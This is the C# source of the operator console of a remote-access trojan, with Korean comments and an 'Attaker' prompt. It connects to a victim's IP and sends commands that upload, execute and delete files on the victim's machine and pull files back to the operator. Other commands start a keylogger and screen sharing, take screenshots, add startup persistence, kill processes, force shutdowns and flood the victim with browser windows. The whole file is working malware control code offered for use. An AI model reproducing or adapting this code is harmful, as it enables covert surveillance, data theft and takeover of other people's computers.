using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace 클라이언트
{
    class Program
    {
        public static string ip, FileName;
        //Set the IP address of the server, and its port.
        public IPEndPoint ipep1;
        public IPEndPoint ipep2;
        public IPEndPoint ipep3;
        public static IPEndPoint ipEndPoint1 = new IPEndPoint(IPAddress.Any, 7777); //파일 다운로드 서버
        public static IPEndPoint ipEndPoint2 = new IPEndPoint(IPAddress.Any, 7778); //더미포트
        public static IPEndPoint ipEndPoint3 = new IPEndPoint(IPAddress.Any, 8181); //더미포트

        public static IPEndPoint[] ipEndPoint = new IPEndPoint[2] { ipEndPoint1, ipEndPoint2 };
        public static string CL_tp1;

        static void Main(string[] args)
        {
            new Program().Start();
        }

        public void Start()
        {
            byte[] data = new byte[1024];

            Console.Write("연결할 IP를 입력하세요 : ");
            ip = Console.ReadLine();
            //TCP Client

            ipep1 = new IPEndPoint(IPAddress.Parse(ip), 8080); //메인 콘솔서버
            ipep2 = new IPEndPoint(IPAddress.Parse(ip), 8081); //파일 업로드 서버
            

            Console.WriteLine("This is a Client, host name is {0}", Dns.GetHostName());
            Console.WriteLine();


            string welcome = "Hello, Multiple server ! "; //Send 되는 문자열



            // port 8080 으로 전송
            try
            {
                //Console.BackgroundColor = ConsoleColor.DarkBlue;

                //Console.Clear();
                // 소켓 생성
                Socket server1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                //서버 연결
                server1.Connect(ipep1);
                Console.WriteLine(Environment.NewLine + "접속시도...");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(Environment.NewLine + "/help 를 입력하여 명령어 목록을 볼 수 있습니다!!");
                Console.ForegroundColor = ConsoleColor.White;

                data = Encoding.Unicode.GetBytes("CONNECT$:" + welcome);
                server1.Send(data);

                byte[] m = new byte[1024];
                int bt = server1.Receive(m);
                Console.WriteLine("Received data : " + Encoding.Unicode.GetString(m, 0, bt));
                Console.WriteLine();

                // 메시지 전송
                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("Attaker : ");
                    Console.ForegroundColor = ConsoleColor.White;
                    welcome = Console.ReadLine();

                    if (welcome == "/help")
                    {
                        help();
                    }
                    else if (welcome == "/업로드")
                    {
                        Console.WriteLine("보낼파일을 실행된 이 프로그램이 있는 경로에 놓은뒤 이름을 쓰시오");
                        Console.WriteLine("이름.확장명" + Environment.NewLine);
                        Console.Write("파일 이름 : ");
                        FileName = Console.ReadLine();

                        welcome = FileName;//보낼 파일의 이름이된다.

                        data = Encoding.Unicode.GetBytes("FTP$:" + welcome);
                        server1.Send(data);

                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);

                        if (Re == "파일이 이미 있거나 잘못 입력되었습니다.")
                        {

                        }
                        else
                        {
                            Thread.Sleep(1000);
                            FTPClient();

                            welcome = "";
                            Console.WriteLine("전송완료");
                        }
                    }
                    else if (welcome == "/파일실행")
                    {
                        string f = "";
                        Console.Write("실행할 파일의 경로와 확장자 명을 모두 입력하세요 : ");
                        f = Console.ReadLine();

                        if (f == "" || f == null || f == string.Empty)
                        {
                            Console.WriteLine("입력되지 않았습니다. 다시입력해 주세요");
                        }
                        else
                        {
                            data = Encoding.Unicode.GetBytes("STF$:" + f);
                            server1.Send(data);

                            byte[] ms = new byte[1024];
                            int b = server1.Receive(ms);
                            Console.WriteLine("Received data : " + Encoding.Unicode.GetString(ms, 0, b));
                            Console.WriteLine();
                        }


                    }
                    else if (welcome == "/창테러")
                    {
                        Console.Write("테러단위? : ");
                        int TR = Convert.ToInt32(Console.ReadLine());

                        if (TR <= 0)
                        {
                            Console.WriteLine("인수가 입력되지 않았습니다. 다시입력해 주세요");
                        }
                        else
                        {
                            Console.Write("테러할 사이트의 주소를 'https://' 를 제외하고 쓰십시오 : ");
                            string w = Console.ReadLine();

                            byte[] sendBuffer = Encoding.Unicode.GetBytes("WIN$:" + TR + ":" + w);
                            server1.Send(sendBuffer);
                        }
                    }
                    else if (welcome == "/셧다운")
                    {
                        int time = 0;
                        Console.Write("몇 초 후 종료시키겠습니까? : ");
                        time = Convert.ToInt32(Console.ReadLine());

                        if (time <= 0)
                        {
                            Console.WriteLine("정상적으로 입력되지 않았습니다. 다시입력해 주세요");
                        }
                        else
                        {
                            data = Encoding.Unicode.GetBytes("STH$:" + time);
                            server1.Send(data);
                        }

                    }
                    else if (welcome == "/키로그시작")
                    {
                        //명령 전송
                        data = Encoding.Unicode.GetBytes("KLO$:" + welcome);
                        server1.Send(data);

                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);
                    }
                    else if (welcome == "/키로그중지")
                    {
                        //명령 전송
                        data = Encoding.Unicode.GetBytes("KLN$:" + welcome);
                        server1.Send(data);

                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);
                    }
                    else if (welcome == "/웹서버실행")
                    {
                        //명령 전송
                        data = Encoding.Unicode.GetBytes("WEB$:" + welcome);
                        server1.Send(data);

                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);
                    }
                    else if (welcome == "/화면공유시작")
                    {
                        //명령 전송
                        data = Encoding.Unicode.GetBytes("RMT$:" + welcome);
                        server1.Send(data);

                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);
                    }
                    else if (welcome == "/화면공유중지")
                    {
                        //명령 전송
                        data = Encoding.Unicode.GetBytes("RMN$:" + welcome);
                        server1.Send(data);

                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);
                    }
                    else if (welcome == "/파일삭제")
                    {
                        Console.Write("삭제할 파일의 경로를 입력해 주세요 : ");
                        welcome = Console.ReadLine();

                        //명령 전송
                        data = Encoding.Unicode.GetBytes("DEF$:" + welcome);
                        server1.Send(data);

                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = "Received data : " + Encoding.Unicode.GetString(ms, 0, b);
                        Console.WriteLine(Re);
                    }
                    else if (welcome == "/메세지")
                    {
                        Console.WriteLine("보낼메세지를 쓰세요");
                        Console.Write("메세지 : ");
                        string ms = Console.ReadLine();

                        welcome = ms;
                        data = Encoding.Unicode.GetBytes("MSG$:" + welcome);
                        server1.Send(data);
                        welcome = "";

                    }
                    else if (welcome == "/팩토리생성")
                    {
                        data = Encoding.Unicode.GetBytes("DIRC$:" + welcome);
                        server1.Send(data);
                        welcome = "";

                    }

                    else if (welcome == "/캡쳐")
                    {
                        data = Encoding.Unicode.GetBytes("CAP$:" + welcome);
                        server1.Send(data);
                        welcome = "";

                    }
                    else if (welcome == "/다운로드")
                    {
                        welcome = "DOWN$";

                        Console.WriteLine("경로를 입력하세요 드라이브문자열 뒤 ':' 는 '*' 로 대체됩니다. ");
                        Console.WriteLine(" ");
                        Console.Write("다운로드 할 것은 무엇인가요? : ");
                        string UP = Console.ReadLine(); //다운로드 경로
                        CL_tp1 = UP;


                        //Console.WriteLine(" ");
                        //Console.Write("다운받을 컴퓨터의 IP는 무엇인가요? : ");
                        //string Yip = Console.ReadLine(); //다운로드 받을 IP정보

                        data = Encoding.Unicode.GetBytes(welcome + ":" + UP);
                        server1.Send(data);


                        //명령 수신
                        byte[] ms = new byte[1024];
                        int b = server1.Receive(ms);
                        string Re = Encoding.Unicode.GetString(ms, 0, b);
                        //Console.WriteLine(Re);


                        //byte[] msg = new byte[1024];
                        //int bytes = server1.Receive(msg);

                        string[] prompt2 = Re.Split('$');
                        Console.WriteLine(prompt2[0]);
                        if (prompt2[0] == "CL_FTP")
                        {
                            //Thread t_handler1 = new Thread(FTPListen);
                            //t_handler1.Start();
                            //Console.WriteLine("FTP서버가 시작되었습니다.");
                            //welcome = "CL_UP$";
                            //data = Encoding.Unicode.GetBytes(welcome);
                            //server1.Send(data);

                            FTPListen();
                            Console.WriteLine("FTP서버가 시작되었습니다.");
                            Console.Write("파일은 전송하시겠습니까? YES or NO: ");
                            string yn = Console.ReadLine();

                            if (yn == "YES" || yn == "yes")
                            {
                                welcome = "CL_UP$";
                                data = Encoding.Unicode.GetBytes(welcome);
                                server1.Send(data);

                            }
                            else
                            {
                                t_handler2.Abort();
                                Console.WriteLine("전송이 중지되었습니다.");
                            }
                        }


                    }


                    else if (welcome == "")
                    {
                        Console.WriteLine("명령입력이 되지 않았습니다.");
                    }
                    else if (welcome == "/전체경로탐색")
                    {
                        try
                        {
                            Console.Write("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다. : ");
                            welcome = Console.ReadLine();

                            data = Encoding.Unicode.GetBytes("DIR$:" + welcome);
                            server1.Send(data);

                            // 메시지 받음
                            byte[] msg = new byte[1024];
                            int bytes = server1.Receive(msg);
                            Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes));
                            Console.WriteLine();

                            string CONECT = "";

                            data = Encoding.Unicode.GetBytes(".");
                            server1.Send(data);

                            byte[] MD = new byte[10485760];
                            bytes = server1.Receive(MD);
                            CONECT = Encoding.Unicode.GetString(MD, 0, bytes);
                            Console.WriteLine(CONECT);
                        }
                        catch
                        {
                            // 메시지 받음
                            byte[] msg = new byte[1024];
                            int bytes = server1.Receive(msg);
                            Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes));
                            Console.WriteLine();
                        }


                    }
                    else if (welcome == "/폴더경로탐색")
                    {
                        Console.Write("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다. : ");
                        welcome = Console.ReadLine();

                        data = Encoding.Unicode.GetBytes("DIRO$:" + welcome);
                        server1.Send(data);


                        //확인메세지
                        byte[] msg1 = new byte[1024];
                        int bytes1 = server1.Receive(msg1);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                        Console.WriteLine();

                        if (Encoding.Unicode.GetString(msg1, 0, bytes1) == "명령을 실행할 수 없습니다.")
                        {
                            Console.WriteLine("탐색중지");
                        }
                        else
                        {
                            //탐색된 메세지
                            byte[] msg2 = new byte[1048576];
                            int bytes2 = server1.Receive(msg2);
                            string DD = "";
                            DD = Encoding.Unicode.GetString(msg2, 0, bytes2);
                            Console.WriteLine(DD);

                            GC.Collect();
                        }
                    }
                    else if (welcome == "/시작프로그램등록")
                    {
                        data = Encoding.Unicode.GetBytes("STT$:");
                        server1.Send(data);

                        //데이터 수신
                        byte[] msg1 = new byte[1024];
                        int bytes1 = server1.Receive(msg1);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                        Console.WriteLine();
                    }
                    else if (welcome == "/시작프로그램등록해제")
                    {
                        data = Encoding.Unicode.GetBytes("STD$:");
                        server1.Send(data);

                        //데이터 수신
                        byte[] msg1 = new byte[1024];
                        int bytes1 = server1.Receive(msg1);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                        Console.WriteLine();
                    }

                    else if (welcome == "/익스종료")
                    {
                        data = Encoding.Unicode.GetBytes("EXT_B$");
                        server1.Send(data);

                        //데이터 수신
                        byte[] msg1 = new byte[1024];
                        int bytes1 = server1.Receive(msg1);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                        Console.WriteLine();
                    }

                    else if (welcome == "/파일경로탐색")
                    {
                        Console.Write("탐색할 경로를 입력해 주세요 단 ':' 표시는 *으로 대체한다. : ");
                        welcome = Console.ReadLine();

                        data = Encoding.Unicode.GetBytes("DIRF$:" + welcome);
                        server1.Send(data);

                        //확인메세지
                        byte[] msg1 = new byte[1024];
                        int bytes1 = server1.Receive(msg1);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                        Console.WriteLine();

                        if (Encoding.Unicode.GetString(msg1, 0, bytes1) == "명령을 실행할 수 없습니다.")
                        {
                            Console.WriteLine("탐색중지");
                        }
                        else
                        {
                            //탐색된 메세지
                            byte[] msg2 = new byte[1048576];
                            int bytes2 = server1.Receive(msg2);
                            string DD = "";
                            DD = Encoding.Unicode.GetString(msg2, 0, bytes2);
                            Console.WriteLine(DD);

                            GC.Collect();
                        }
                    }
                    else if (welcome == "/프로그램종료")
                    {
                        data = Encoding.Unicode.GetBytes("KILL$:");
                        server1.Send(data);

                        byte[] msg1 = new byte[1024];
                        int bytes1 = server1.Receive(msg1);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg1, 0, bytes1));
                        Console.WriteLine();
                    }
                    else if (welcome == "/프로세스탐색")
                    {
                        data = Encoding.Unicode.GetBytes("PKL$:");
                        server1.Send(data);

                        // 메시지 받음
                        byte[] msg = new byte[1048576];
                        int bytes = server1.Receive(msg);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes));
                        Console.WriteLine();
                    }
                    else if (welcome == "/프로세스종료")
                    {
                        Console.WriteLine("종료할 프로세스 이름을 적어주세요");
                        Console.Write("프로세스이름 : ");
                        string ms = Console.ReadLine();

                        welcome = ms;
                        data = Encoding.Unicode.GetBytes("PKL_KILL$:" + welcome);
                        server1.Send(data);
                        welcome = "";


                        // 메시지 받음
                        byte[] msg = new byte[1024];
                        int bytes = server1.Receive(msg);
                        Console.WriteLine("Received data : " + Encoding.Unicode.GetString(msg, 0, bytes));
                        Console.WriteLine();
                    }

                    else
                    {
                        data = Encoding.Unicode.GetBytes(welcome);
                        server1.Send(data);
                        Console.WriteLine("Send by the port : {0}", server1.LocalEndPoint.ToString());
                        Console.WriteLine("Send data : {0}", welcome);

                        // 메시지 받음
                        byte[] msg = new byte[1024];
                        int bytes = server1.Receive(msg);
                        Console.WriteLine("Received data : {0}", Encoding.Unicode.GetString(msg, 0, bytes));
                        Console.WriteLine();
                        // 소켓 닫기
                        //server1.Close();
                    }
                }

            }
            catch (Exception ex) { Console.WriteLine(ex.Message); }



            
            // port 8081 으로 전송
            //try
            //{
                // 소켓 생성
            //    Socket server2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                // 메시지 전송
            //    data = Encoding.Unicode.GetBytes(welcome);
            //    server2.Connect(ipep2);
            //    server2.Send(data);
            //    Console.WriteLine("Send by the port : {0}", server2.LocalEndPoint.ToString());
            //    Console.WriteLine("Send data : {0}", welcome);

                // 메시지 받음
            //    byte[] msg = new byte[1024];
            //    int bytes = server2.Receive(msg);
            //    Console.WriteLine("Received data : {0}", Encoding.Unicode.GetString(msg, 0, bytes));
            //    Console.WriteLine();
                // 소켓 닫기
            //    server2.Close();
            //}
            //catch(Exception ex) { Console.WriteLine(ex.Message); }

            Console.ReadKey();
        }


        Thread t_handler2;
        Thread t_handler1;
        Socket SC;
        public void FTPListen()
        {
            SC = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            SC.Bind(ipEndPoint3);
            t_handler2 = new Thread(Down_FTPServer);
            t_handler2.IsBackground = true;
            t_handler2.Start(SC);
            Console.WriteLine("다운로드성공");
        }

        public void Down_FTPServer(object sender)
        {
            Socket m_client = sender as Socket;
            m_client.Listen(100);
            Socket newSocket = m_client.Accept();
            Console.WriteLine("연결대기 성공");

            byte[] buffer = new byte[4];
            newSocket.Receive(buffer);
            int fileLenghth = BitConverter.ToInt32(buffer, 0);
            buffer = new byte[1024];
            int totalLength = 0;
            Console.WriteLine("블럭처리 성공");
            //MessageBox.Show(Path.GetFileName(CL_tp1).ToString());
            FileStream fileStr = new FileStream(Path.GetFileName(CL_tp1), FileMode.Create, FileAccess.Write);
            BinaryWriter writer = new BinaryWriter(fileStr);
            Console.WriteLine("마지막단계 성공");
            while(totalLength < fileLenghth)
            {
                int receiveLength = newSocket.Receive(buffer);
                writer.Write(buffer, 0, receiveLength);
                totalLength += receiveLength;
            }
            Console.WriteLine("전송받음");
            writer.Close();
            newSocket.Close();
            m_client.Close();
        }

        void FTPClient()
        {
            try
            {
                //Socket mySocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //mySocket.Connect(IPAddress.Parse(ip), 8888);
                Socket server2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                server2.Connect(ipep2);

                FileStream fileStr = new FileStream(FileName, FileMode.Open, FileAccess.Read);
                int fileLength = (int)fileStr.Length;
                byte[] buffer = BitConverter.GetBytes(fileLength);
                server2.Send(buffer);
                int count = fileLength / 1024 + 1;

                BinaryReader reader = new BinaryReader(fileStr);

                for (int i = 0; i < count; i++)
                {
                    buffer = reader.ReadBytes(1024);
                    server2.Send(buffer);
                }
                reader.Close();
                server2.Close();
            }
            catch
            {
                Console.WriteLine("전송완료");
            }
        }

        void help()
        {
            Console.WriteLine("/다운로드 : 원하는 경로의 파일을 다운로드 받습니다");
            Console.WriteLine("/업로드 : 파일을 전송하고 C:\\factory\\ 에 저장합니다.");
            Console.WriteLine("/창테러 : n개의 인터넷창을 테러합니다.\n/익스종료 : 모든 인터넷창을 종료합니다.");
            Console.WriteLine("/셧다운 : 컴퓨터를 종료시켜버립니다.");
            Console.WriteLine("/캡쳐 : 바탕화면을 캡쳐하여 C:\\work\\ 에 저장합니다.");
            //Console.WriteLine("/전체경로탐색 : 지정된 경로의 파일과 폴더 목록을 전부 보여줍니다.");
            Console.WriteLine("/폴더경로탐색 : 지정된 경로안의 폴더목록을 전부 보여줍니다.");
            Console.WriteLine("/파일경로탐색 : 지정된 경로안의 폴더목록을 전부 보여줍니다.");
            Console.WriteLine("/파일삭제 : 서버의 지정된 경로의 파일을 삭제합니다.");
            Console.WriteLine("/파일실행 : 서버의 지정된 경로의 파일을 실행합니다.");
            Console.WriteLine("/시작프로그램등록 : 시작프로그램으로 등록합니다.");
            Console.WriteLine("/시작프로그램등록해제 : 시작프로그램 등록을 해제합니다.");
            Console.WriteLine("/프로그램종료 : 서버 프로그램을 종료 합니다.");
            Console.WriteLine("/메세지 : 서버가 작동중인 컴퓨터에 메세지를 띄웁니다.");
            //Console.WriteLine("/키로그시작 : 키보드 키의 로그를 타겟 컴퓨터의 C:\\factory\\key\\ 에 사진과 로그로 남깁니다.");
            //Console.WriteLine("/키로그중지 : 키로그를 중지합니다.");
            Console.WriteLine("/화면공유시작 : 타겟의 화면을 웹으로 공유합니다.");
            Console.WriteLine("/화면공유중지 : 화면공유를 중지합니다.");
            //Console.WriteLine("/웹서버시작(미구현 개발) : 타겟의 컴퓨터에서 ASP.NET 형태의 웹서버를 만듭니다.");
            Console.WriteLine("/팩토리생성 : 타겟의 컴퓨터에 C:\factory 경로로 폴더를 생성합니다. ");
            Console.WriteLine("/프로세스탐색 : 타겟 컴퓨터의 실행중인 프로세스 목록을 가져옵니다.");
            Console.WriteLine("/프로세스종료 : 타겟 컴퓨터의 실행중인 프로세스를 강제종료합니다.");
        }
    }

    class ListenPorts
    {
        Socket[] socket;
        IPEndPoint[] ipEndPoint;
        public static string FTPFileN;

        internal ListenPorts(IPEndPoint[] ipEndPoint)
        {
            this.ipEndPoint = ipEndPoint;
            socket = new Socket[ipEndPoint.Length];
        }

        public void FTPServer(object sender)
        {
            FTPFileN = "DOWN.zip";

            if(File.Exists("DOWN.zip"))
            {
                File.Delete("DOWN.zip");
            }

            Socket m_client = sender as Socket;
            m_client.Listen(100);
            Socket newSocket = m_client.Accept();
            Console.WriteLine("연결대기 성공");

            byte[] buffer = new byte[4];
            newSocket.Receive(buffer);
            int fileLength = BitConverter.ToInt32(buffer, 0);
            buffer = new byte[1024];
            int totalLength = 0;
            Console.WriteLine("성공");
            Console.WriteLine(FTPFileN);

            FileStream fileStr = new FileStream(FTPFileN, FileMode.Create, FileAccess.Write);
            BinaryWriter writer = new BinaryWriter(fileStr);
            Console.WriteLine("마지막단계 성공");
            while (totalLength < fileLength)
            {

                int receiveLength = newSocket.Receive(buffer);
                writer.Write(buffer, 0, receiveLength);
                totalLength += receiveLength;

            }
            Console.WriteLine("전송받음");
            writer.Close();
            newSocket.Close();
            m_client.Close();
            return;
        }




    }
}
